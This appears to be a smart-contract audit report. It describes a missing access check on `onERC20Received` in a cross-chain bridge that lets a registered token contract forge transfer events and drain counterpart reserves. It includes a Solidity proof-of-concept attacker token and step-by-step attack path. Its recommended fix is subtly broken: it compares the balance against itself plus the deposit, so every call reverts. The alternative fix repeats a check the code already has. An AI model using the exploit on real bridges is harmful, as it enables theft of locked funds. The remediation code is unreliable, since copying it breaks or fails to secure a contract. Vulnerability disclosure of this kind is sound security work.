### Title
Unguarded `onERC20Received` Allows Any Registered Token Contract to Emit Fraudulent Cross-Chain Transfer Events Without Locking Tokens — (File: `contracts/service_chain/bridge/BridgeTransferERC20.sol`)

---

### Summary

`BridgeTransferERC20.onERC20Received` is declared `public` with no verification that the caller actually deposited tokens into the bridge before invoking it. Any contract whose address is registered as a bridge token can call this function directly, bypassing the token-transfer step, and cause the bridge to emit a `RequestValueTransfer` event and advance `requestNonce` — without a single token being locked or burned on the source chain. Bridge operators watching the source chain will faithfully relay the event to the counterpart bridge, which will then transfer real tokens to the attacker's chosen recipient.

---

### Finding Description

The intended 1-step deposit flow is:

1. User calls `token.requestValueTransfer(amount, to, feeLimit, extraData)`.
2. The token contract executes `transfer(bridge, amount + feeLimit)` — tokens arrive at the bridge.
3. The token contract calls `bridge.onERC20Received(user, to, amount, feeLimit, extraData)`.
4. The bridge processes the request.

`onERC20Received` is `public` with no modifier:

```solidity
// contracts/service_chain/bridge/BridgeTransferERC20.sol  line 111-121
function onERC20Received(
    address _from,
    address _to,
    uint256 _value,
    uint256 _feeLimit,
    bytes memory _extraData
)
    public          // ← no access control
{
    _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
}
``` [1](#0-0) 

`_requestERC20Transfer` applies `onlyRegisteredToken(_tokenAddress)` where `_tokenAddress = msg.sender`:

```solidity
// line 76-108
function _requestERC20Transfer(
    address _tokenAddress, ...
)
    internal
    onlyRegisteredToken(_tokenAddress)   // msg.sender must be a registered token
    onlyUnlockedToken(_tokenAddress)
{
    require(isRunning, "stopped bridge");
    require(_value > 0, "zero ERC20 token amount");

    uint256 fee = _payERC20FeeAndRefundChange(_from, _tokenAddress, _feeLimit);

    if (modeMintBurn) {
        ERC20Burnable(_tokenAddress).burn(_value);   // burns from bridge's balance
    }

    emit RequestValueTransfer(...);
    requestNonce++;
}
``` [2](#0-1) 

`_payERC20FeeAndRefundChange` with `_feeLimit = 0` and `fee = 0` performs no token movement:

```solidity
// contracts/service_chain/bridge/BridgeFee.sol  line 68-88
function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal returns(uint256) {
    uint256 fee = feeOfERC20[_token];
    if (feeReceiver != address(0) && fee > 0) { ... }   // skipped when fee == 0
    if (_feeLimit > 0) { ... }                           // skipped when feeLimit == 0
    return 0;
}
``` [3](#0-2) 

**Attack path (non-mint-burn mode, fee = 0):**

A contract whose address is registered as a bridge token calls:

```
bridge.onERC20Received(victim, attacker, 1_000_000e18, 0, "")
```

without transferring a single token. Because `msg.sender` passes `onlyRegisteredToken`, the call succeeds:

- `_payERC20FeeAndRefundChange` does nothing (fee = 0, feeLimit = 0).
- No burn (non-mint-burn mode).
- `RequestValueTransfer` is emitted: `from = victim`, `to = attacker`, `value = 1_000_000e18`.
- `requestNonce` is incremented.

Bridge operators relay the event and call `handleERC20Transfer` on the counterpart bridge:

```solidity
// line 68-72
if (modeMintBurn) {
    require(ERC20Mintable(_tokenAddress).mint(_to, _value), ...);
} else {
    IERC20(_tokenAddress).safeTransfer(_to, _value);   // drains counterpart bridge reserves
}
``` [4](#0-3) 

The counterpart bridge transfers `1_000_000e18` tokens to the attacker from its own reserves — with zero tokens ever locked on the source chain.

**Attack path (mint-burn mode):**

The same call triggers `ERC20Burnable(token).burn(value)` on the bridge's token balance. If the bridge holds any accumulated balance (e.g., from partial refunds or direct transfers), those tokens are destroyed without authorization, reducing the circulating supply and breaking the mint-burn accounting invariant.

---

### Impact Explanation

- **Non-mint-burn mode**: The counterpart bridge's token reserves are drained by the spoofed `value` amount per fraudulent call. The source-chain bridge's balance does not increase, breaking the lock-and-release invariant. Repeated calls drain the entire counterpart reserve.
- **Mint-burn mode**: Tokens held by the bridge are burned without any user initiating a legitimate transfer, reducing the token's circulating supply and corrupting the cross-chain accounting.
- `requestNonce` is permanently advanced, which can also be used to exhaust the nonce window and block legitimate transfers.

---

### Likelihood Explanation

The trigger requires `msg.sender` to be a registered token contract. Token registration is gated by `onlyOwner` on the bridge. However:

1. A bridge operator or token issuer who controls a registered token contract (a common deployment pattern) can exploit this without any additional privilege escalation.
2. Any registered token contract that exposes a function allowing arbitrary callers to invoke `bridge.onERC20Received` (e.g., a token with a misconfigured or malicious `requestValueTransfer`-like function) becomes an unprivileged attack vector.
3. The condition `fee = 0` (or `feeReceiver = address(0)`) is common during initial bridge deployment and testing periods.

---

### Recommendation

Add a balance snapshot before and after the expected token deposit inside `onERC20Received`, and revert if the bridge's balance did not increase by at least `_value + _feeLimit`:

```solidity
function onERC20Received(
    address _from, address _to, uint256 _value,
    uint256 _feeLimit, bytes memory _extraData
) public {
    uint256 balanceBefore = IERC20(msg.sender).balanceOf(address(this));
    // tokens must already be in the bridge (sent by the token contract before this call)
    require(
        IERC20(msg.sender).balanceOf(address(this)) >= balanceBefore + _value + _feeLimit,
        "tokens not received"
    );
    _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
}
```

Alternatively, restrict `onERC20Received` so it can only be called in the same transaction as a token transfer (e.g., via a reentrancy-style guard or by checking `tx.origin` patterns), or add an explicit `onlyRegisteredToken(msg.sender)` modifier directly on `onERC20Received` and document that the token contract is responsible for the pre-transfer.

---

### Proof of Concept

```solidity
// Attacker controls MaliciousToken, which is registered on the bridge.
contract MaliciousToken is ERC20Burnable, ERC20Mintable {
    IBridge public bridge;

    // Called by attacker to spoof a cross-chain transfer of `amount` to `recipient`
    // without transferring any tokens.
    function spoofTransfer(address recipient, uint256 amount) external {
        // No transfer to bridge — balance unchanged.
        bridge.onERC20Received(
            msg.sender,   // _from (irrelevant)
            recipient,    // _to   (attacker's address on counterpart chain)
            amount,       // _value
            0,            // _feeLimit (avoids fee check)
            ""
        );
        // bridge emits RequestValueTransfer(ERC20, msg.sender, recipient, address(this), amount, nonce, 0, "")
        // Operators relay → counterpart bridge calls safeTransfer(recipient, amount)
        // Counterpart bridge reserves drained by `amount`.
    }
}
```

Steps:
1. Bridge owner registers `MaliciousToken` on the source-chain bridge (`registerToken`).
2. Attacker calls `MaliciousToken.spoofTransfer(attacker, 1_000_000e18)`.
3. Source-chain bridge emits `RequestValueTransfer` with no tokens locked.
4. Operators call `handleERC20Transfer` on counterpart bridge.
5. Counterpart bridge executes `safeTransfer(attacker, 1_000_000e18)`, draining its reserves.

### Citations

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L68-72)
```text
        if (modeMintBurn) {
            require(ERC20Mintable(_tokenAddress).mint(_to, _value), "handleERC20Transfer: mint failed");
        } else {
            IERC20(_tokenAddress).safeTransfer(_to, _value);
        }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L76-108)
```text
    function _requestERC20Transfer(
        address _tokenAddress,
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        internal
        onlyRegisteredToken(_tokenAddress)
        onlyUnlockedToken(_tokenAddress)
    {
        require(isRunning, "stopped bridge");
        require(_value > 0, "zero ERC20 token amount");

        uint256 fee = _payERC20FeeAndRefundChange(_from, _tokenAddress, _feeLimit);

        if (modeMintBurn) {
            ERC20Burnable(_tokenAddress).burn(_value);
        }

        emit RequestValueTransfer(
            TokenType.ERC20,
            _from,
            _to,
            _tokenAddress,
            _value,
            requestNonce,
            fee,
            _extraData
        );
        requestNonce++;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L111-121)
```text
    function onERC20Received(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        public
    {
        _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
    }
```

**File:** contracts/service_chain/bridge/BridgeFee.sol (L68-88)
```text
    function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal returns(uint256) {
        uint256 fee = feeOfERC20[_token];

        if (feeReceiver != address(0) && fee > 0) {
            require(_feeLimit >= fee, "insufficient feeLimit");

            IERC20(_token).safeTransfer(feeReceiver, fee);

            uint256 feeRefund = _feeLimit.sub(fee);
            if (feeRefund > 0) {
                IERC20(_token).safeTransfer(from, feeRefund);
            }

            return fee;
        }

        if (_feeLimit > 0) {
            IERC20(_token).safeTransfer(from, _feeLimit);
        }
        return 0;
    }
```
